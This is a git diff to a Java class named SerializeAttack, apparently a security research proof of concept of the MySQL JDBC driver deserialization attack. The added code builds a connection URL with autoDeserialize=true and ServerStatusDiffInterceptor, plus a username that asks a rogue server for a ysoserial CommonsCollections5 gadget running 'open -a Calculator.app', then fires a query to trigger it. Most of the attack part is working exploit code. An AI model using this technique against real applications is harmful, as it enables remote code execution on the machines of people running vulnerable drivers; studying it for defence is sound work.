@@ -2,6 +2,8 @@ package org.example.mysql;
 
 import java.sql.Connection;
 import java.sql.DriverManager;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
 
 /**
  * 反序列化
@@ -12,6 +14,21 @@ import java.sql.DriverManager;
  */
 public class SerializeAttack {
     public static void main(String[] args) throws Exception {
+        /**
+         * [5.1.1, 5.1.10]
+         * 使用 statementInterceptors 参数
+         * 需要通过 查询调用
+         */
+        String serializeAttackUrl_5_1_10 = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app";
+        String username = "yso_CommonsCollections5_open -a Calculator.app";
+        String password = "";
+        Class.forName("com.mysql.jdbc.Driver");
+        Connection con = DriverManager.getConnection(serializeAttackUrl_5_1_10, username, password);
+        String sql = "select database()";
+        PreparedStatement ps = con.prepareStatement(sql);
+        ResultSet resultSet = ps.executeQuery();
+
+
         /**
          * [5.1.11, 5.1.48]
          * 使用 statementInterceptors 参数
@@ -46,9 +63,7 @@ public class SerializeAttack {
 //        String driver = "com.mysql.jdbc.Driver";
 //        Class.forName(driver);
 
-
-        Connection connection = DriverManager.getConnection(serializeAttackUrl_8_7_19);
-
+        Connection connection = DriverManager.getConnection(serializeAttackUrl_5_29_40);
 
     }
 
